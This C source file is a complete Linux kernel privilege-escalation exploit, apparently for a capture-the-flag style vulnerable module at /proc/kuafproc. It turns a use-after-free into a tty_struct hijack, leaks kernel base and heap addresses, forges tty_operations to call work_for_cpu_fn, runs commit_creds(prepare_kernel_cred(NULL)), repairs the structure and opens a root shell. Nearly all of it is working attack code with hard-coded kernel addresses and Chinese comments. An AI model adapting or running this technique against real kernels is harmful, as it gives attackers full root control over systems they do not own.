//gcc -masm=intel -static exploit.c -o exploit
//home/heap/uaf/tty/exploit

#define _GNU_SOURCE
#include "mykernelpwn.h"

#define tty_struct_size 0x2e0
#define ptm_unix98_ops 0xffffffff8208eea0
#define pty_unix98_ops 0xffffffff8208ed80
#define commit_creds 0xffffffff810b7fb0
#define prepare_kernel_cred 0xffffffff810b8360
#define work_for_cpu_fn 0xffffffff810ac640

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct note_data {
    size_t size;
    char* data;
};

int kuaf_fd;

void kuaf_add(size_t idx, size_t size, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}


void kuaf_edit(size_t idx, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}

// kfree(&notebook[idx]->data)
void kuaf_del(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x334455, &note);
}

void kuaf_gift(void* buf)
{
    struct kuaf_note note = {
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x445566, &note);
}

// 把 notebook[idx]->data 数据读到 buf
ssize_t kuaf_read(int idx, void* buf)
{
    return read(kuaf_fd, buf, idx);
}

int main(int argc, char** argv, char** envp)
{
    struct note_data kernel_notebook[0x10];
    struct tty_operations fake_tty_ops;

    pthread_t uffd_monitor_thread, add_fix_size_thread, edit_uaf_thread;

    size_t fake_tty_struct_data[0x100], tty_ops, orig_tty_struct_data[0x100];
    size_t tty_struct_addr, fake_tty_ops_addr;
    int tty_fd;

    save_status();
    bind_core(0);

    // 打开 proc
    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("Failed to open /proc/kuafproc!");
    }

    // 获得一个 tty-size object
    note_info("Allocating tty_struct-size object...");
    // "ccelend" 写入 notebook[0]->data
    kuaf_add(0, tty_struct_size, "ccelend");
    kuaf_del(0);

    // tty_struct 分配到 notebook[0]->data 指向的堆
    note_info("Leaking kernel_base by tty_struct...");
    tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    
    // 原本的 tty_struct 保存到 orig_tty_struct_data，为后来的恢复做准备
    kuaf_read(0, orig_tty_struct_data);
    if (*(int*)orig_tty_struct_data != 0x5401) {
        err_exit("Failed to hit the tty_struct!");
    }

    tty_ops = orig_tty_struct_data[3];
    kernel_offset = ((tty_ops & 0xfff) == (pty_unix98_ops & 0xfff) 
                       ? (tty_ops - pty_unix98_ops) : tty_ops - ptm_unix98_ops);
    kernel_base += kernel_offset;
    printf("\033[32m\033[1m[+] Kernel offset: %p\033[0m\n", kernel_offset);
    printf("\033[32m\033[1m[+] Kernel base: %p\033[0m\n", kernel_base);

    /* construct fake tty_ops */
    note_info("Construct fake tty_operations...");
    fake_tty_ops.ioctl = kernel_offset + work_for_cpu_fn;
    //把 fake_tty_ops 数据写入 notebook[1]->data 指向的堆
    kuaf_add(1, sizeof(struct tty_operations), &fake_tty_ops);
   
    /* get kernel addr of tty_struct and tty_ops by gift */
    note_info("Leaking kernel heap addr by gift...");
    kuaf_gift(&kernel_notebook);
    tty_struct_addr = kernel_notebook[0].data;
    fake_tty_ops_addr = kernel_notebook[1].data;
    printf("\033[32m\033[1m[+] Tty_struct at: %p\033[0m\n", tty_struct_addr);
    printf("\033[32m\033[1m[+] Fake_tty_ops at: %p\033[0m\n", fake_tty_ops_addr);


    // prepare_kernel_cred(NULL)
    note_info("Triger commit_creds(prepare_kernel_cred(NULL)) and fix tty...");
    memcpy(fake_tty_struct_data, orig_tty_struct_data, 0x2e0);
    fake_tty_struct_data[3] = fake_tty_ops_addr;
    fake_tty_struct_data[4] = kernel_offset + prepare_kernel_cred;
    fake_tty_struct_data[5] = NULL;
    kuaf_edit(0, fake_tty_struct_data);
    // 调用 tty_operations 的 ioctl 接口执行 work_for_cpu_fn，再执行 prepare_kernel_cred(NULL)
    ioctl(tty_fd, 233, 233);

    // commit_creds(&root_cred)
    kuaf_read(0, fake_tty_struct_data);
    fake_tty_struct_data[4] = kernel_offset + commit_creds;
    // fake_tty_struct_data[6] 保存了 prepare_kernel_cred(NULL) 的返回值
    fake_tty_struct_data[5] = fake_tty_struct_data[6];      
    fake_tty_struct_data[6] = orig_tty_struct_data[6];
    kuaf_edit(0, fake_tty_struct_data);
    ioctl(tty_fd, 233, 233);

    // 修复 tty_struct 结构体
    memcpy(fake_tty_struct_data, orig_tty_struct_data, 0x2e0);
    kuaf_edit(0, fake_tty_struct_data);

    get_root_shell();
    return 0;
}